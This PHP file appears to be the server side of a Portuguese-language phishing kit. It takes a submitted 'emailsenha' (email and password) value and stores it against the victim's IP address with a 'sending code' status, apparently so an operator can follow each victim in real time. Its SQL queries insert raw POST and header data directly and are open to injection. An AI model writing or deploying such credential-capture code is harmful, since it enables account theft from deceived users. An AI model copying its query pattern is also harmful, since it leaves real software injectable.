<?php
session_start();
error_reporting(0);
//Incluindo a conexão com banco de dados
require_once "../cod3rconfig/registro.php";
require_once "../cod3rconfig/conexao.php";
require_once "../cod3rconfig/data.php";
  
 // DEFINE O FUSO HORARIO COMO O HORARIO DE BRASILIA
    date_default_timezone_set('America/Sao_Paulo');   


   $ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);



$token = $_POST['emailsenha'];
$tempo = time();
$atualiza = mysqli_query(DBCOnnect(), "UPDATE infos SET tempo='$tempo', dados_do_email='$token', status='Enviando codigo', statusremote='Enviando codigo!' WHERE ip='$ip'");

echo 1;
 $tempo = time();
  
   //faz uma consulta para verificar se o ip já existe no banco de dados
   $verifica = mysqli_query(DBCOnnect(), "SELECT * FROM som WHERE ip ='$ip'");
   //retorna a quantidade de linhas da consulta ou seja, pode retornar 0 ou 1 linha
   $linhas  = mysqli_num_rows($verifica); 
  //se não existir o ip no banco ele grava um com um tempo determinado
   if($linhas == 0)
   { 
      // gravando o IP e o tempo no DB
         $acrescenta = mysqli_query(DBCOnnect(), "INSERT INTO som (ip, status, tempo) VALUES ('$ip','info2', '$tempo')");
   }
   else
   { 
      // se o IP já existe ele o pega e atualiza o tempo no DB no IP selecionado
      //pega o IP retornado da consulta
     
    $ip = mysqli_fetch_assoc($verifica);
    $ip = $ip['ip'];

      //faz um update para o registro do IP existente
       $atualiza = mysqli_query(DBCOnnect(), "UPDATE som SET tempo ='$tempo' WHERE ip='$ip'"); 
   
   }

?>